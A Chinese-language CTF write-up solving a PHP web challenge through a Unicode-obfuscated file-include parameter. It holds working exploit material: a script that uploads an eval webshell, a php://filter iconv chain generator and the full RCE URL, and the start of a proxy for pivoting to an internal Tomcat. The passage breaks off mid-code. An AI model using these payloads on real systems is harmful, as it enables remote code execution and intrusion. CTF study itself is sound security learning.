<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$_</span>=@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;‮imaohw?⁦⁩⁦whoami&#x27;</span>];<span class="hljs-comment">//</span><br>    <span class="hljs-variable">$__</span>=<span class="hljs-string">&quot;/var/www/html&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_</span> &amp;&amp; @<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">file</span>(<span class="hljs-variable">$_</span>)[<span class="hljs-number">0</span>],<span class="hljs-number">0</span>,<span class="hljs-number">6</span>) === <span class="hljs-string">&#x27;@&lt;?php&#x27;</span>)&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_</span>);<br>    &#125;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>        <span class="hljs-variable">$$key</span> = <span class="hljs-variable">$value</span>;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-variable">$__</span>));<br></code></pre></td></tr></table></figure>


<p>上来有个小陷阱，在传参的地方，用鼠标选，会发现注释处左右的字符串不受你控制，这里考的就是<code>unicode</code>字符串了</p>
<p>当复制代码进某些编辑器中可以看到识别到了一些<code>Unicode</code>字符串,参数很明显不是<code>whoami</code>了<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb-ezweb_new-1.png"></p>
<p>将<code>[U+202E]</code>等进行Url编码，得到<code>%E2%80%AEimaohw?%E2%81%A6%E2%81%A9%E2%81%A6whoami</code></p>
<p>继续往下看，可以有两种方法做</p>
<p>方法一：<br>PHP崩溃getshell</p>
<p>使php崩溃后保留下临时文件，然后利用<code>scandir</code>查文件名，最后包含达到getshell</p>
<p>写马：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://82.157.177.192:46728/?%E2%80%AEimaohw%3F%E2%81%A6%E2%81%A9%E2%81%A6whoami=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span><br>paramsMultipart = [(<span class="hljs-string">&#x27;file&#x27;</span>, (<span class="hljs-string">&#x27;a.php&#x27;</span>, <span class="hljs-string">&quot;@&lt;?php\r\neval(\x24_POST[&#x27;a&#x27;]);\r\necho 123;\r\n?&gt;&quot;</span>, <span class="hljs-string">&#x27;application/octet-stream&#x27;</span>))]<br><br>requests.post(url,files=paramsMultipart)<br></code></pre></td></tr></table></figure>

<p>查文件名：<br><code>http://82.157.177.192:46728/?%E2%80%AEimaohw?%E2%81%A6%E2%81%A9%E2%81%A6whoami=1&amp;__=/tmp/</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb-ezweb_new-2.png"></p>
<p>getshell：<br><code>http://82.157.177.192:46728/??%E2%80%AEimaohw?%E2%81%A6%E2%81%A9%E2%81%A6whoami=/tmp/phpsxtpjV</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb-ezweb_new-3.png"></p>
<p>方法二：<br>filter构造一句话rce</p>
<p><a href="https://blog.csdn.net/rfrder/article/details/122326155">原理参考1</a><br><a href="https://tttang.com/archive/1395/">原理参考2</a></p>
<p><a href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT">项目地址</a></p>
<p>师傅们如果生成出来的payload不能用的话可以试试切换系统，比如用ubuntu或者kali或者debian试试（不要用windows，因为在windows下文件名不区分大小写），还有php版本尽量跟题目保持一致，否则服务器上的iconv默认支持和靶机不一样，就会无效。要是还不行就试试项目中的fuzzer.php，重新构造下(我构造这个花了一天的时间，呜呜呜)</p>
<p>我的poc</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">file_to_use = <span class="hljs-string">&quot;/etc/passwd&quot;</span><br><br><span class="hljs-comment">#@&lt;?php eval($_POST[2]);;?&gt;</span><br>base64_payload = <span class="hljs-string">&quot;QDw/cGhwIGV2YWwoJF9QT1NUWzJdKTs7Pz4K&quot;</span><br><br><span class="hljs-comment"># generate some garbage base64</span><br>filters = <span class="hljs-string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span><br>filters += <span class="hljs-string">&quot;convert.base64-encode|&quot;</span><br><span class="hljs-comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span><br>filters += <span class="hljs-string">&quot;convert.iconv.UTF8.UTF7|&quot;</span><br><br><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> base64_payload[::-<span class="hljs-number">1</span>]:<br>        <span class="hljs-keyword">if</span>(c==<span class="hljs-string">&quot;/&quot;</span>):<br>            c=<span class="hljs-string">&quot;%2f&quot;</span><br>        filters += <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./res/&#x27;</span>+c).read() + <span class="hljs-string">&quot;|&quot;</span><br>        <span class="hljs-comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span><br>        filters += <span class="hljs-string">&quot;convert.base64-decode|&quot;</span><br>        filters += <span class="hljs-string">&quot;convert.base64-encode|&quot;</span><br>        <span class="hljs-comment"># get rid of equal signs</span><br>        filters += <span class="hljs-string">&quot;convert.iconv.UTF8.UTF7|&quot;</span><br><br>filters += <span class="hljs-string">&quot;convert.base64-decode&quot;</span><br><br>final_payload = <span class="hljs-string">f&quot;php://filter/<span class="hljs-subst">&#123;filters&#125;</span>/resource=<span class="hljs-subst">&#123;file_to_use&#125;</span>&quot;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(<span class="hljs-string">&#x27;&lt;?php echo file_get_contents(&quot;&#x27;</span>+final_payload+<span class="hljs-string">&#x27;&quot;);?&gt;&#x27;</span>)<br><span class="hljs-built_in">print</span>(final_payload)<br></code></pre></td></tr></table></figure>



<div class="note note-info">
            <p><a href="http://47.94.151.201:31863/?%E2%80%AEimaohw?%E2%81%A6%E2%81%A9%E2%81%A6whoami=php://filter/convert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP866.CSUNICODE%7Cconvert.iconv.CSISOLATIN5.ISO_6937-2%7Cconvert.iconv.CP950.UTF-16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.865.UTF16%7Cconvert.iconv.CP901.ISO6937%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.iconv.ISO-IR-103.850%7Cconvert.iconv.PT154.UCS4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.iconv.CSA_T500.L4%7Cconvert.iconv.ISO_8859-2.ISO-IR-103%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.GBK.BIG5%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UNICODE%7Cconvert.iconv.ISIRI3342.UCS4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.865.UTF16%7Cconvert.iconv.CP901.ISO6937%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP869.UTF-32%7Cconvert.iconv.MACUK.UCS4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.ISO88597.UTF16%7Cconvert.iconv.RK1048.UCS-4LE%7Cconvert.iconv.UTF32.CP1167%7Cconvert.iconv.CP9066.CSUCS4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.iconv.CSA_T500.L4%7Cconvert.iconv.ISO_8859-2.ISO-IR-103%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.iconv.CSA_T500-1983.UCS-2BE%7Cconvert.iconv.MIK.UCS2%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.CP950.SHIFT_JISX0213%7Cconvert.iconv.UHC.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UNICODE%7Cconvert.iconv.ISIRI3342.UCS4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.JS.UNICODE%7Cconvert.iconv.L4.UCS2%7Cconvert.iconv.UCS-4LE.OSF05010001%7Cconvert.iconv.IBM912.UTF-16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP367.UTF-16%7Cconvert.iconv.CSIBM901.SHIFT_JISX0213%7Cconvert.iconv.UHC.CP1361%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.CP949.UTF32BE%7Cconvert.iconv.ISO_69372.CSIBM921%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP861.UTF-16%7Cconvert.iconv.L4.GB13000%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSGB2312.UTF-32%7Cconvert.iconv.IBM-1161.IBM932%7Cconvert.iconv.GB13000.UTF16BE%7Cconvert.iconv.864.UTF-32LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L4.UTF32%7Cconvert.iconv.CP1250.UCS-2%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.iconv.CSA_T500-1983.UCS-2BE%7Cconvert.iconv.MIK.UCS2%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode/resource=/etc/passwd">http://47.94.151.201:31863/?%E2%80%AEimaohw?%E2%81%A6%E2%81%A9%E2%81%A6whoami=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd</a></p><p>POST<br>2&#x3D;system(‘ls’);</p>
          </div>


<p>用上面两种方法都能getshell，但是会发现读不了flag，没权限</p>
<p>用<code>ps -aux</code>命令看下进程，发现root用户开了个<code>tomcat</code>服务</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb-ezweb_new-4.png"></p>
<p>curl试一下tomcat的默认8080端口，有内容</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb-ezweb_new-5.png"></p>
<p>但是命令行不好做题，就先考虑代理出来</p>
<p>web根目录下传个<code>proxy.php</code>，注意修改下地址</p>
<p><a href="https://blog.csdn.net/weixin_44599931/article/details/124981841">项目地址</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment">    PHP接口代理转发：</span><br><span class="hljs-comment">    以Golang接口转发为例；</span><br><span class="hljs-comment">    如有必要，请设置内网IP为白名单；</span><br><span class="hljs-comment">    建议内网接口返回格式：Content-Type: text/html; charset=UTF-8；</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment">    使用示例：</span><br><span class="hljs-comment">    $host = &quot;http://127.0.0.2&quot;; // 外网网址（主网址或有部分路径）</span><br><span class="hljs-comment">    $intranet = &#x27;http://127.0.0.4&#x27;; // 内网网址（主网址或有部分路径）</span><br><span class="hljs-comment">    $php_proxy = new php_proxy();</span><br><span class="hljs-comment">    $back = $php_proxy-&gt;request_intranet($host, $intranet);</span><br><span class="hljs-comment">    echo $back;</span><br><span class="hljs-comment"> * */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">php_proxy</span></span>&#123;<br> <br>    <span class="hljs-comment">// 发送get、post请求</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">request_option</span>(<span class="hljs-params"><span class="hljs-variable">$request_url</span>=<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$method</span>=<span class="hljs-string">&#x27;post&#x27;</span>, <span class="hljs-variable">$request_data</span>=[], <span class="hljs-variable">$to_json</span>=<span class="hljs-literal">false</span></span>): <span class="hljs-title">string</span></span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$request_url</span>)) &#123;<br>            <span class="hljs-variable">$back</span> = <span class="hljs-string">&#x27;&#123;&quot;state&quot;:0, &quot;msg&quot;:&quot;request_url is null&quot;, &quot;content&quot;:&quot;&quot;&#125;&#x27;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$method</span> == <span class="hljs-string">&#x27;post&#x27;</span> || <span class="hljs-variable">$method</span> == <span class="hljs-string">&#x27;POST&#x27;</span>)&#123;<br>                <span class="hljs-variable">$body</span> = <span class="hljs-title function_ invoke__">http_build_query</span>(<span class="hljs-variable">$request_data</span>);<br>                <span class="hljs-variable">$options</span> = [<br>                    <span class="hljs-string">&#x27;http&#x27;</span> =&gt; [<br>                        <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-comment">// 注意要大写</span><br>                        <span class="hljs-string">&#x27;header&#x27;</span> =&gt; <span class="hljs-string">&#x27;Content-type:application/x-www-form-urlencoded&#x27;</span>,<br>                        <span class="hljs-string">&#x27;content&#x27;</span> =&gt; <span class="hljs-variable">$body</span>,<br>                        <span class="hljs-string">&#x27;ignore_errors&#x27;</span>=&gt; <span class="hljs-literal">true</span>, <span class="hljs-comment">// 忽略报错，直接返回接口内容</span><br>                    ],<br>                ];<br>                <span class="hljs-variable">$context</span> = <span class="hljs-title function_ invoke__">stream_context_create</span>(<span class="hljs-variable">$options</span>);<br>                <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$request_url</span>, <span class="hljs-literal">false</span>, <span class="hljs-variable">$context</span>);<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$method</span> == <span class="hljs-string">&#x27;get&#x27;</span>|| <span class="hljs-variable">$method</span> == <span class="hljs-string">&#x27;GET&#x27;</span>)&#123;<br>                <span class="hljs-variable">$curl</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>                <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_URL, <span class="hljs-variable">$request_url</span>);<br>                <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>); <span class="hljs-comment">// 不抓取头部信息。只返回数据</span><br>                <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_TIMEOUT, (<span class="hljs-keyword">int</span>)<span class="hljs-number">60000</span>); <span class="hljs-comment">// 超时设置</span><br>                <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>); <span class="hljs-comment">// 1表示不返回bool值</span><br>                <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$curl</span>);<br>                <span class="hljs-comment">// $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); // 获取接口状态码</span><br>                <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$curl</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$data</span> = <span class="hljs-string">&#x27;&#123;&quot;state&quot;:0, &quot;msg&quot;:&quot;method error. method is only in [get, post], options etc be not supported.&quot;, &quot;content&quot;:&quot;&quot;&#125;&#x27;</span>;<br>            &#125;<br> <br>            <span class="hljs-variable">$back</span> = <span class="hljs-variable">$data</span>;<br>        &#125;<br> <br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$to_json</span> == <span class="hljs-literal">true</span>)&#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$back</span>, <span class="hljs-literal">true</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-variable">$back</span>;<br>        &#125;<br> <br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>    &#125;<br> <br>    <span class="hljs-comment">// 获取完整网址</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_url</span>(<span class="hljs-params"></span>): <span class="hljs-title">string</span></span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTPS&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTPS&#x27;</span>] == <span class="hljs-string">&#x27;on&#x27;</span>) &#123;<br>            <span class="hljs-variable">$url</span> = <span class="hljs-string">&#x27;https://&#x27;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$url</span> = <span class="hljs-string">&#x27;http://&#x27;</span>;<br>        &#125;<br>        <span class="hljs-comment">//这里的逻辑会导致访问内网的URI与内网相同</span><br>        <span class="hljs-comment">//采用PATH_INFO的模式来表示内网需要的URI</span><br>        <span class="hljs-comment">//即 外 http://127.0.0.1/proxy.php/index =&gt; 内 http://127.0.0.1/index</span><br>        <span class="hljs-comment">// return $url.$_SERVER[&#x27;SERVER_NAME&#x27;].&#x27;:&#x27;.$_SERVER[&#x27;SERVER_PORT&#x27;].$_SERVER[&#x27;REQUEST_URI&#x27;];</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$url</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SERVER_NAME&#x27;</span>].<span class="hljs-string">&#x27;:&#x27;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SERVER_PORT&#x27;</span>].<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PATH_INFO&#x27;</span>];<br>    &#125;<br> <br>    <span class="hljs-comment">// 是post</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_post</span>(<span class="hljs-params"></span>): <span class="hljs-title">bool</span></span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">isset</span>(<span 